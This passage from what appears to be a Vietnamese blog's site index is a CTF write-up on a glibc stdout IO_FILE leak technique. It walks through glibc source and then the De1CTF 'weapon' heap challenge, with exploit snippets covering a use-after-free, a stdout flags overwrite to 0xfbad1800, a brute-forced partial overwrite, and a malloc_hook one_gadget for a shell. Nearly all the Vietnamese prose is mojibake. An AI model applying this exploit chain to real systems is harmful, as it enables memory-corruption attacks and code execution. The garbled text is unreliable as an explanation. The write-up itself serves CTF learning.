\u0026#34;Hello World!\u0026#34; .text .globl main .type main, @function main: pushq %rbp movq %rsp, %rbp movl $.LC0, %edi call puts popq %rbp ret Ti·∫øp theo th√¨ ta s·∫Ω xem h√†m puts l√†m g√¨ ·ªü libc-2.31 (phi√™n b·∫£n m√† m√¨nh ƒëang s·ª≠ d·ª•ng hi·ªán t·∫°i) Th·ª±c t·∫ø th√¨ codebase c·ªßa glibc r·∫•t l√† r·ªông v√† c√°ch ho·∫°t ƒë·ªông c·ªßa n√≥ n·∫±m ·ªü ph·∫°m v·ªã vƒ© m√¥, v√¨ th·∫ø n√™n r·∫•t kh√≥ ƒë·ªÉ c√≥ th·ªÉ ƒë·ªãnh h∆∞·ªõng ƒë∆∞·ª£c m·ª•c ti√™u m√† m√¨nh c·∫ßn. Khi nh√¨n v√†o codebase ta c√≥ th·ªÉ th·∫•y weak_alias (_IO_puts, puts) ·ªü trong file libio/ioputs.c. ·ªû trong glibc, ƒëi·ªÅu n√†y c√≥ nghƒ©a l√† b·∫•t k·ª≥ ai khi g·ªçi h√†m puts th√¨ th·ª±c t·∫ø thay v√†o ƒë√≥ s·∫Ω g·ªçi IO_puts H√†m IO_puts nh∆∞ sau\nint _IO_puts (const char *str) { int result = EOF; size_t len = strlen (str); _IO_acquire_lock (_IO_stdout); if ((_IO_vtable_offset (_IO_stdout) != 0 || _IO_fwide (_IO_stdout, -1) == -1) \u0026amp;\u0026amp; _IO_sputn (_IO_stdout, str, len) == len \u0026amp;\u0026amp; _IO_putc_unlocked (\u0026#39;\\n\u0026#39;, _IO_stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (_IO_stdout); return result; } M·ªõ ·ªü tr√™n ch√∫ng ta kh√¥ng c·∫ßn ph·∫£i ƒë·ªÉ √Ω t·∫•t c·∫£ m√† ch·ªâ c·∫ßn focus v√¥ h√†m IO_sputn. H√†m IO_sputn ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a t·∫°i libio/libioP.h, line 374 (as a macro) ƒê√†o s√¢u v√†o trong ta th·∫•y n√≥ l√† 1 n√πi c√°c macro nh√¨n m√† kh√¥ng th·∫•y ƒë∆∞·ªùng ra Sau m·ªôt h·ªìi m·∫Øt m√¨nh ƒë·∫£o nh∆∞ rang l·∫°c th√¨ m√¨nh ƒë√£ t√¨m ra ƒë∆∞·ª£c m·ªôt c√°i function li√™n quan ƒë·∫øn v·∫•n ƒë·ªÅ m√† ch√∫ng ta ƒëang ƒë·ªÅ c·∫≠p, ƒë√≥ ch√≠nh l√† _IO_new_file_xsputn ƒë∆∞·ª£c m√¥ t·∫£ t·∫°i libio/libioP.h, line 596 (as a prototype) Sau m·ªôt th·ªùi gian m√≤ m·∫´m code c·ªßa h√†m _IO_new_file_xsputn th√¨ cu·ªëi c√πng n√≥ c≈©ng ƒë√£ d·ª´ng l·∫°i t·∫°i h√†m _IO_OVERFLOW ƒë∆∞·ª£c defined t·∫°i libio/libioP.h, line 141 (as a macro) (L√†m c√°i m·ªõ n√†y m√¨nh c≈©ng ƒëang kh√¥ng bi·∫øt ƒëang l√†m mics hay l√†m pwn n·ªØa \u0026hellip; :confused:) V√† cu·ªëi c√πng th√¨ ƒë√¢y ch√≠nh l√† c√°i m√† ch√∫ng ta ƒëang c·∫ßn t√¨m:\nint _IO_new_file_overflow (FILE *f, int ch) { if (f-\u0026gt;_flags \u0026amp; _IO_NO_WRITES) /* SET ERROR */ { f-\u0026gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } /* If currently reading or no buffer allocated. */ if ((f-\u0026gt;_flags \u0026amp; _IO_CURRENTLY_PUTTING) == 0 || f-\u0026gt;_IO_write_base == NULL) { /* Allocate a buffer if needed. */ if (f-\u0026gt;_IO_write_base == NULL) { _IO_doallocbuf (f); _IO_setg (f, f-\u0026gt;_IO_buf_base, f-\u0026gt;_IO_buf_base, f-\u0026gt;_IO_buf_base); } if (__glibc_unlikely (_IO_in_backup (f))) { size_t nbackup = f-\u0026gt;_IO_read_end - f-\u0026gt;_IO_read_ptr; _IO_free_backup_area (f); f-\u0026gt;_IO_read_base -= MIN (nbackup, f-\u0026gt;_IO_read_base - f-\u0026gt;_IO_buf_base); f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_read_base; } if (f-\u0026gt;_IO_read_ptr == f-\u0026gt;_IO_buf_end) f-\u0026gt;_IO_read_end = f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_buf_base; f-\u0026gt;_IO_write_ptr = f-\u0026gt;_IO_read_ptr; f-\u0026gt;_IO_write_base = f-\u0026gt;_IO_write_ptr; f-\u0026gt;_IO_write_end = f-\u0026gt;_IO_buf_end; f-\u0026gt;_IO_read_base = f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_read_end; f-\u0026gt;_flags |= _IO_CURRENTLY_PUTTING; if (f-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; f-\u0026gt;_flags \u0026amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) f-\u0026gt;_IO_write_end = f-\u0026gt;_IO_write_ptr; } if (ch == EOF) return _IO_do_write (f, f-\u0026gt;_IO_write_base, f-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_base); if (f-\u0026gt;_IO_write_ptr == f-\u0026gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-\u0026gt;_IO_write_ptr++ = ch; if ((f-\u0026gt;_flags \u0026amp; _IO_UNBUFFERED) || ((f-\u0026gt;_flags \u0026amp; _IO_LINE_BUF) \u0026amp;\u0026amp; ch == \u0026#39;\\n\u0026#39;)) if (_IO_do_write (f, f-\u0026gt;_IO_write_base, f-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch; } ƒê·ªÉ c√≥ th·ªÉ gi·∫£i th√≠ch c√°i h√†m tr√™n th√¨ ch·∫Øc ƒë·∫øn m√πa qu√Ωt m√¨nh m·ªõi gi·∫£i quy·∫øt ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†y m·∫•t, ch√∫ng ta h√£y focus v√†o h√†m _IO_do_write th√¨ n√≥ ch√≠nh l√† h√†m cu·ªëi c√πng ƒë∆∞·ª£c g·ªçi v√† _IO_write_base ch√≠nh l√† tham s·ªë cu·ªëi c√πng m√† ch√∫ng ta c·∫ßn modify. ƒê·ªÉ c√≥ th·ªÉ ch·∫°m ƒë∆∞·ª£c ƒë·∫øn h√†m if cu·ªëi c√πng th√¨ ch√∫ng ta c·∫ßn ph·∫£i bypass t·∫•t c·∫£ h√†m if ·ªü tr√™n, ch√∫ng ta kh√¥ng mu·ªën ph·∫£i v∆∞·ªõng v√†o m·ªôt trong c√°c nh√°nh c·ªßa h√†m if ƒë√≥ ƒë√¢u. Quay v·ªÅ b√™n tr√™n c√πng, ch√∫ng ta s·∫Ω bypass t·ª´ng h√†m if m·ªôt.\n·ªû h√†m if ƒë·∫ßu ti√™n c√°i gi√° tr·ªã f-\u0026gt;flag \u0026amp; _IO_NO_WRITES ph·∫£i l√† 0, ƒë·ªÉ kh√¥ng d√≠nh v√†o b√™n trong h√†m if. Ti·∫øp theo ch√∫ng ta ph·∫£i set f-\u0026gt;flag \u0026amp; _IO_CURRENTLY_PUTTING b·∫±ng 1 ƒë·ªÉ kh√¥ng v√†o b√™n trong h√†m if th·ª© 2 ƒê√†o s√¢u m·ªôt t√≠ v√†o h√†m _IO_do_write th√¨ ta s·∫Ω th·∫•y m·ªôt h√†m n·ªØa ch·∫°y c√πng v·ªõi h√†m tr√™n ƒë√≥ l√† _IO_new_do_write static size_t new_do_write (FILE *fp, const char *data, size_t to_do) { size_t count; if (fp-\u0026gt;_flags \u0026amp; _IO_IS_APPENDING) fp-\u0026gt;_offset = _IO_pos_BAD; else if (fp-\u0026gt;_IO_read_end != fp-\u0026gt;_IO_write_base) { off64_t new_pos = _IO_SYSSEEK (fp, fp-\u0026gt;_IO_write_base - fp-\u0026gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-\u0026gt;_offset = new_pos; } count = _IO_SYSWRITE (fp, data, to_do); //our aim ... return count; } V√† ƒë√¢y ch√≠nh l√† m·ª•c ti√™u cu·ªëi c√πng c·ªßa ch√∫ng ta (ho·∫∑c th·ª© g√¨ ƒë√≥ x√™m x√™m) _IO_SYSWRITE (fp, data, to_do) Sau khi l∆∞·ª£c qua c√°c h√†m if th√¨ ƒë·ªÉ c√≥ th·ªÉ bypass t·∫•t c·∫£ c√°c h√†m if tr√™n l√† b·∫•t kh·∫£ thi(nhi·ªÅu l√≠ do kh√≥ c√≥ th·ªÉ m√† khai th√°c ƒë∆∞·ª£c, c√≥ m·ªôt c√°i v·∫•n ƒë·ªÅ m√† ch√∫ng ta kh√¥ng th·ªÉ control n√≥ ƒë∆∞·ª£c ƒë√≥ l√† fp-\u0026gt;_IO_write_base - fp-\u0026gt;_IO_read_end. N·∫øu nh∆∞ ch√∫ng ta set fp-\u0026gt;_IO_read_end th√†nh 0, d·∫´n t·ªõi h·∫≠u qu·∫£ l√† tham s·ªë th·ª© 2 s·∫Ω qu√° d√†i, v√† n·∫øu ta set fp-\u0026gt;_IO_write_base \u0026gt; fp-\u0026gt;_IO_read_end th√¨ ch√∫ng ta s·∫Ω d√≠nh l·ªói ·ªü 1 ch·ªó kh√°c, t·∫°i v√¨ _IO_write_base s·∫Ω tr·ªü n√™n l·ªõn h∆°n _IO_write_ptr m√† c√°i ta c·∫ßn l√† _IO_write_base ph·∫£i nh·ªè h∆°n _IO_write_ptr), d∆∞·ªùng nh∆∞ ch√∫ng ta ch·ªâ c√≥ l·ª±a ch·ªçn skip qua h√†m else if, ƒë·ªÉ hi·ªán th·ª±c h√≥a ƒëi·ªÅu n√†y th√¨ ta c·∫ßn focus v√†ofp-\u0026gt;_IO_write_base v√† fp-\u0026gt;_IO_read_end, d·ª±a v√†o source code tr√™n th√¨ ta c√≥ th·ªÉ suy ra ƒë∆∞·ª£c ƒë√≥ l√† ta ph·∫£i set fp-\u0026gt;flags \u0026amp; _IO_is_appending\nInconclusion # _IO_file ƒë∆∞·ª£c bao g·ªìm trong _IO_FILE_plus c√≥ c·∫•u tr√∫c nh∆∞ b√™n d∆∞·ªõi:\nstruct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; _IO_FILE ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a d∆∞·ªõi d·∫°ng linked list, ƒë·∫ßu node c·ªßa list tr√™n l√† _IO_list_all. T√≥m t·∫Øt s∆° qua th√¨ IO_list_all s·∫Ω tr·ªè ƒë·∫øn stderr (file descriptor l√† 2) ti·∫øp theo s·∫Ω tr·ªè ƒë·∫øn stdout(file descriptor l√† 1) v√† cu·ªëi c√πng tr·ªè ƒë·∫øn stdin(file descriptor l√† 0). D∆∞·ªõi ƒë√¢y l√† nh·ªØng gi√° tr·ªã c·∫ßn thi·∫øt cho vi·ªác bypass to√†n b·ªô nh·ªØng h√†m if ·ªü b√™n tr√™n v√† ƒë·∫°t ƒë·∫øn m·ª•c ti√™u cu·ªëi c√πng.\n_flags = 0xfbad0000 //magic number _flags \u0026amp;= _IO_NO_WRITE //flag = 0xfbad0000 _flag |= _IO_CURRENTLY_PUTTING //flag = 0xfbad0800 _flag |= _IO_IS_APPENDING //flag = 0xfbad1800 V·∫≠y t·∫•t c·∫£ nh·ªØng g√¨ ch√∫ng ta c·∫ßn l√†m ƒë√≥ ch√≠nh l√† set stdout-\u0026gt;flags th√†nh 0xfbad1800 v√† ƒë·ªÉ leak m√† th·ª© ch√∫ng ta c·∫ßn th√¨ ch√∫ng ta ph·∫£i t√≠nh to√°n offset c·ª• th·ªÉ ƒë·ªÉ c√≥ th·ªÉ ghi ƒë√®, c·ª• th·ªÉ ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† c√°i ch·ª©c nƒÉng m√† ta output v√≠ d·ª• nh∆∞ l√† puts ch·∫≥ng h·∫°n ph·∫£i d·ª±a v√†o k·∫øt qu·∫£ c·ªßa IO_write_ptr - IO_write_base\nTrƒÉm nghe th√¨ kh√¥ng b·∫±ng m·ªôt th·∫•y, ·ªü d∆∞·ªõi m√¨nh demo technique tr√™n b·∫±ng c√¢u weapon c·ªßa gi·∫£i De1CTF\nWeapon # Analyze # Nh∆∞ m·ªôt th√≥i quen th√¨ m·ªçi challenge pwn th√¨ m√¨nh s·∫Ω lu√¥n check file, checksec, check c√°c l·ªói c∆° b·∫£n, v\u0026hellip;v.. Nh√¨n v√†o th√¨ ƒë·ªÅ b√†i cho m·ªôt file ELF 64-bit, b·ªã stripped v√† full mitigation (full ƒë·ªì full gi√°p \u0026hellip;.) \u0026ldquo;L√† m·ªôt th·∫±ng ƒë√†n √¥ng th√¨ kh√¥ng ch√πn b∆∞·ªõc tr∆∞·ªõc m·ªçi th·ª≠ th√°ch\u0026rdquo;\nƒê·ªÅ cho ta 1 v√≤ng l·∫∑p, trong ƒë√≥ c√≥ 3 function c∆° b·∫£n c·ªßa 1 b√†i heap: Create, delete v√† kh√¥ng ƒë∆∞·ª£c cung c·∫•p h√†m in ƒë·ªÉ tr√°nh leak libc address ho·∫∑c nh·ªØng address quan tr·ªçng, b√π l·∫°i ta ƒë∆∞·ª£c h√†m rename m·ªôt weapon(ch·∫Øc ch·∫Øn s·∫Ω c√≥ √≠ch trong l∆∞∆°ng lai)\nH√†m Create: ƒê∆°n gi·∫£n ch·ªâ l√† nh·∫≠p size c·ªßa m·ªôt chunk, index v√† data c·ªßa chunk ƒë√≥ th√¥ng qua bi·∫øn name. H√†m Delete: T∆∞∆°ng t·ª± nh∆∞ m·ªçi ƒë·ªÅ heap kh√°c, ch·ªâ ƒë·ªãnh free m·ªôt chunk ƒë√£ c√≥ s·∫µn th√¥ng qua bi·∫øn index H√†m rename: Thay ƒë·ªïi n·ªôi dung c·ªßa m·ªôt chunk ch·ªâ ƒë·ªãnh th√¥ng qua bi·∫øn index. Nh√¨n k·ªπ h∆°n b·∫±ng ida(m√¨nh ƒë√£ thay ƒë·ªïi t√™n bi·∫øn v√† m·ªôt s·ªë t√™n h√†m ƒë·ªÉ nh√¨n hi·ªÉu r√µ h∆°n)\nH√†m main nh∆∞ m√¨nh ƒë√£ n√≥i ·ªü tr√™n :arrow_up: H√†m Create: B√†i n√†y ch·ªâ gi·ªõi h·∫°n size c·ªßa m·ªôt chunk trong kho·∫£ng 0 ƒë·∫øn 96, v√¨ libc b√†i n√†y cho ch·ªâ l√† phi√™n b·∫£n libc-2.23 v·∫≠y n√™n s·∫Ω kh√¥ng c√≥ tcache m√† b√†i n√†y ch·ªâ g√≥i g·ªçn trong fastbin, tuy b·ªã gi·ªõi h·∫°n trong fastbin nh∆∞ng d∆∞·ªùng nh∆∞ b√†i n√†y kh√¥ng c√≥ gi·ªõi h·∫°n s·ªë l∆∞·ª£ng chunk ƒë∆∞·ª£c cho ph√©p.\nH√†m Delete: Bug n·∫±m ·ªü trong h√†m delete n√†y, b·∫•t c·ª© m·ªôt ng∆∞·ªùi ch∆°i pwn n√†o khi nh√¨n v√†o h√†m n√†y c≈©ng s·∫Ω nh·∫≠n ra ƒë∆∞·ª£c bug :lol: Bug ·ªü ƒë√¢y ƒë√≥ l√† h√†m n√†y kh√¥ng set pointer v·ªÅ null d·∫´n ƒë·∫øn l·ªói use-after-free ho·∫∑c l√† double free, c√≥ r·∫•t l√† nhi·ªÅu c√°ch ƒë·ªÉ t·∫≠n d·ª•ng hai l·ªói n√†y.\n·ªû b√†i n√†y ta c√≥ th·ªÉ t·∫≠n d·ª•ng l·ªói uaf t·∫°o ra chunk overlapped ƒë·ªÉ h√¨nh th√†nh unsorted bin sau ƒë√≥ ghi ƒë√® fd m·ªôt chunk ƒë·ªÉ leak libc, ngo√†i ra th√¨ ta c√≥ th·ªÉ t·∫≠n d·ª•ng l·ªói uaf ƒë·ªÉ h∆∞·ªõng ƒë·∫øn c·∫•u tr√∫c stdout, modify flags bit ƒë·ªÉ leak libc, v√¨ b√†i n√†y kh√¥ng c√≥ h√†m in ra n√™n m√¨nh s·∫Ω k·∫øt h·ª£p c·∫£ hai c√°ch tr√™n ƒë·ªÉ c√≥ th·ªÉ leak ra ƒë∆∞·ª£c flag.\nM√¨nh kh√¥ng bi·∫øt b√†i n√†y r·ªët cu·ªôc b·ªã c√°i g√¨, nh∆∞ng m√† l√†m ·ªü local d√πng env libc-2.23.so th√¨ b·ªã l·ªói timeout, c√≤n n·∫øu d√πng env ·ªü m√°y m√¨nh th√¨ kh√¥ng t·∫≠n d·ª•ng bug ·ªü tr√™n ƒë∆∞·ª£c ,m√¨nh ng·ªìi loay hoay s·ª≠a g·∫ßn c·∫£ ti·∫øng v·∫´n kh√¥ng fix ƒë∆∞·ª£c :sadge_pepe:. V·∫≠y n√™n m√¨nh s·∫Ω n√≥i s∆° qua v·ªÅ √Ω t∆∞·ªüng exploit v√† m√¨nh ƒë·ªÉ script exploit ·ªü b√™n d∆∞·ªõi, c√≤n n·∫øu b·∫°n mu·ªën th√¨ b·∫°n h√£y debug ƒë·ªÉ h√¨nh dung technique tr√™n ho·∫°t ƒë·ªông ra sao, I\u0026rsquo;m so sorry :(\nH∆∞·ªõng exploit # ƒê·∫ßu ti√™n th√¨ fd pointer c·ªßa fastbin s·∫Ω tr·ªè ƒë·∫øn libc c·ª• th·ªÉ l√† main_arena + 88, nh∆∞ng b·ªüi v√¨ size ƒë∆∞·ª£c cho ph√©p ph·∫£i nh·ªè h∆°n 0x60 n√™n kh√¥ng th·ªÉ tr·ª±c ti·∫øp l·∫•y ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa libc th√¥ng qua fd pointer, thay v√†o ƒë√≥ ta s·∫Ω t·∫≠n d·ª•ng l·ªói uaf, th√¥ng qua bug tr√™n th√¨ ta c√≥ th·ªÉ ƒë·∫©y 1 chunk v√†o fastbin, sau ƒë√≥ ta c√≥ th·ªÉ fake m·ªôt chunk v·ªõi size t∆∞∆°ng th√≠ch v·ªõi size c·ªßa unsorted_bin, sau ƒë√≥ free chunk ƒë√≥ m·ªôt l·∫ßn n·ªØa, k·∫øt qu·∫£ l√† chunk m√† ch√∫ng ta fake s·∫Ω n·∫±m trong fastbin v√† unsorted_bin, ngo√†i ra fd pointer s·∫Ω tr·ªè ƒë·∫øn libc. Sau khi c√≥ ƒë∆∞·ª£c libc th√¨ ch·ªâ c·∫ßn t·∫≠n d·ª•ng l·ªói uaf ghi ƒë√® malloc_hook th√†nh one_gadget ƒë·ªÉ c√≥ ƒë∆∞·ª£c shell. √ù t∆∞·ªüng l√† nh∆∞ v·∫≠y.\nƒê·∫ßu ti√™n th√¨ m√¨nh s·∫Ω alloc 3 chunk v·ªõi size 0x70 v√† sau ƒë√≥ free hai chunk ƒë·∫ßu ti√™n ƒë·ªÉ t·∫≠n d·ª•ng l·ªói uaf v·ªõi m·ª•c ƒë√≠ch ch·ªìng ch√©o c√°c chunk l√™n nhau cho b∆∞·ªõc ti·∫øp theo ƒë√≥ l√† modify ƒë·ªãa ch·ªâ c·∫ßn mu·ªën. alloc(0,0x60,p64(0) + p64(0x71)) alloc(1,0x60,p64(0) + p64(0x51)) alloc(2,0x60,p64(0)*3 + p64(0x51)) delete(0) delete(1) rename(1,b\u0026#39;\\x10\u0026#39;) alloc(3,0x60,b\u0026#39;a\u0026#39;) # b√¢y gi·ªù fd c·ªßa chunk 3 tr·ªè t·ªõi ƒë·ªãa ch·ªâ c·ªßa chunk1+0x10 B√¢y gi·ªù ta malloc chunk 4, sau ƒë√≥ rename chunk 4 ƒë·ªÉ c√≥ th·ªÉ modify size c·ªßa chunk 1 b·ªüi v√¨ ta ƒë√£ t·∫°o 1 link gi·ªØa chunk 3 v√† chunk 1(fd chunk 3 -\u0026gt; chunk1 + 0x10) c√≥ nghƒ©a l√† khi ta modify chunk 3 th√¨ ta ƒëang modify chunk 1. Free chunk 1 ƒë·ªÉ ƒë·∫©y chunk 1 v√†o fastbin, thay ƒë·ªïi size sao cho size c·ªßa chunk 1 t∆∞∆°ng th√≠ch v·ªõi size c·ªßa unsorted_bin. K·∫øt qu·∫£ ta thu l·∫°i ƒë∆∞·ª£c ƒë√≥ l√† chunk 1 ƒëang n·∫±m ·ªü fastbin v√† unsorted_bin (Minh h·ªça cho √Ω t∆∞·ªüng tr√™n)\nalloc(4,0x60,p64(0)*0xb + p64(0x71)) delete(1) rename(4,p64(0)*0xb + p64(0x91)) delete(1) gdb.attach(r) B√¢y gi·ªù th√¨ ta ch·ªâ c·∫ßn modify 2 byte cu·ªëi fd pointer c·ªßa chunk 1(main_arena + 88) n·∫±m trong unsorted_bin th√†nh ƒë·ªãa ch·ªâ m√† ta mu·ªën. C√°i m√† g·∫ßn nh·∫•t v·ªõi main_arena + 88 ch√≠nh l√† _IO_2_1_stdout, ch·ªâ c√≥ 4 byte cu·ªëi c·ªßa hai ƒë·ªãa ch·ªâ m√† ta n√≥i ·ªü tr√™n l√† kh√°c nhau B·ªüi v√¨ aslr tr√™n server ƒë∆∞·ª£c b·∫≠t v√¨ v·∫≠y n·∫øu ta ghi ƒë√® 0x7fxxxxx5b78 th√†nh 0x7fxxxxx6620 th√¨ kh√¥ng kh·∫£ thi v√¨ 3 bits cu·ªëi 620 s·∫Ω gi·ªØ nguy√™n, nh∆∞ng bit th·ª© 4 t·ª´ d∆∞·ªõi l√™n(\u0026ldquo;6\u0026rdquo;) s·∫Ω lu√¥n random\nT√¨m ki·∫øm m·ªôt l√∫c th√¨ c√≥ 1 ƒë·ªãa ch·ªâ ph√π h·ª£p ƒë√≥ l√† 0x7fxxxxx25dd, v√¨ bit 5dd(ƒë·ªãa ch·ªâ c·ªßa fake chunk) gi·ªØ nguy√™n c√≤n bit c√≥ gi√° tr·ªã \u0026ldquo;2\u0026rdquo; random th√¨ ta c√≥ th·ªÉ brute-force ƒë·∫øn khi n√†o g·∫∑p ƒë∆∞·ª£c bit ƒë√≥. Sau khi ta ƒë√£ applied ƒë·ªãa ch·ªâ fd c·ªßa 2 chunk(m·ªôt c√°i n·∫±m ·ªü fastbin v√† c√°i c√≤n l·∫°i ·ªü unsorted_bin) c√≥ size 0x70 g·∫ßn v·ªõi ƒë·ªãa ch·ªâ c·ªßa _IO_2_1_stdout b·∫±ng c√°ch ghi ƒë√® ƒë·ªãa ch·ªâ c·ªßa main_arena+88 th√†nh 0x7fxxxx25dd th√¨ ta s·∫Ω fill bi·∫øn flags c·ªßa _IO_stdout th√†nh 0xfbad1800 v√† 2 s·ªë cu·ªëi c·ªßa _IO_write_base th√†nh \\x00 s·∫Ω khi·∫øn cho n√≥ nh·ªè h∆°n do ƒë√≥ ta s·∫Ω leak ƒë∆∞·ª£c nhi·ªÅu th·ª© h∆°n.\nrename(1,b\u0026#39;\\xdd\\x25\u0026#39;) alloc(5,0x60,b\u0026#39;a\u0026#39;) alloc(6,0x60,b\u0026#39;A\u0026#39;*0x33 + p64(0xfbad1800) + p64(0)*3 + b\u0026#39;\\x00\u0026#39;) Sau khi ƒë√£ ghi ƒë√® th√¨ struct c·ªßa _IO_2_1_stdout s·∫Ω nh∆∞ n√†y\npwndbg\u0026gt; p _IO_2_1_stdout_ $2 = { file = { _flags = -72542208, //0xfbad1800 _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x7ffff7dd2600 \u0026lt;_IO_2_1_stderr_+192\u0026gt; \u0026#39;A\u0026#39; \u0026lt;repeats 32 times\u0026gt;, //ghi ƒë√® 2 s·ªë cu·ªëi th√†nh \\x00 . . . }, vtable = 0x7ffff7dd06e0 \u0026lt;_IO_file_jumps\u0026gt; } Sau khi modified stdout th√¨ khi ch∆∞∆°ng tr√¨nh g·ªçi puts(·ªü l·∫ßn ti·∫øp theo) th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω in ra ƒë·ªãa ch·ªâ c·ªßa _IO_2_1_stderr v√¨ n√≥ n·∫±m ·ªü sau _IO_list_all (t·ªâ l·ªá 1/16 khi brute-force ta s·∫Ω leak ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa libc :lol:) Sau khi ƒë√£ c√≥ libc base address th√¨ ta c√≥ ƒë∆∞·ª£c ƒë·ªãa ch·ªâ g·ªëc c·ªßa malloc_hook, sau ƒë√≥ d√πng theo ph∆∞∆°ng ph√°p tr√™n, ta malloc m·ªôt chunk v·ªõi size 0x60 ƒë·ªÉ ƒë·∫©y chunk ƒë√≥ v√†o fastbin, ti·∫øp theo modify fd c·ªßa chunk ƒë√≥ v√†o fake chunk m√† ta mu·ªën, ·ªü ƒë√¢y ƒë√≥ l√† malloc_hook - 0x23. Malloc chunk ƒë√≥ l·∫°i ƒë·ªÉ c√≥ ƒë∆∞·ª£c fake chunk ta mu·ªën, sau ƒë√≥ malloc m·ªôt chunk v·ªõi size 0x60, fill b·ªüi one_gadget. Cu·ªëi c√πng malloc m·ªôt chunk m·ªõi ƒë·ªÉ trigger malloc_hook l√† c√≥ ƒë∆∞·ª£c shell.\n","date":"16 September 2022","externalUrl":null,"permalink":"/posts/technique_angelboy_leak/","section":"Posts","summary":"A technique for you to leak libc without output function","title":"Technique: Angelboy's Leak: using IO_FILE to leak libc","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]